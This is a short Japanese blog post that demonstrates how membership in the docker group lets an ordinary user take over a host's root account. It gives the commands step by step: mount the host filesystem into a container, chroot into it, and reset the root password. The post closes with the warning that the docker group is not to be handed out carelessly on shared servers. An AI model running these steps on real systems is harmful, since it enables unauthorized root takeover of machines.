---
title: dockerグループの権限でホストのrootアカウントを奪取する
pubtime: 2016-06-14T10:27:00+09:00
tags: [Linux, Docker, セキュリティ]
description: dockerを使うときに使うdockerグループの権限があれば、そのホストのrootアカウントを簡単に奪取出来るそうです。実際に試してみました。
---

[docker](https://www.docker.com/)というコンテナ型の仮想化ソフトがありますよね。
セキュリティが宜しくないとかで、置き換えを目指す[rkt](https://coreos.com/rkt/)という別のソフトウェアが出て来ていたりします。

調べてみたところ、dockerグループに属した一般ユーザーがrootの権限を使えるらしいです。ヤバそうです。試してみました。

ひとまず、ubuntuか何かのイメージを落してきます。使うイメージはなんでも良いと思います。
ちなみにホストマシンには[CoreOS](https://coreos.com/)を使ってみました。
```
ホストマシン $ docker pull ubuntu
```

出来たら、起動します。
```
ホストマシン $ docker run -itv /:/mnt ubuntu /bin/bash
```
ホストマシンのルートディレクトリを`/mnt`にマウントしている、というのがポイントです。
あとのオプションは適当に調べてください。

次に、ホストマシンのルートディレクトリにchrootを行ないます。
```
コンテナ # chroot /mnt /bin/bash
```
これでホストマシンのrootに（擬似的に）なれました。

rootのパスワードを変えます。
```
chrootしたあと # passwd
```
これが出来たら、あとはexit2回でマシンを閉じます。

設定したパスワードでログイン出来るか試してみましょう。
```
ホストマシン $ su -
Password:
```
普通にrootになれると思います。

ね、簡単でしょう？
共有サーバーで運用する場合、dockerグループも迂闊に渡さないようにしたほうが良さそうです…。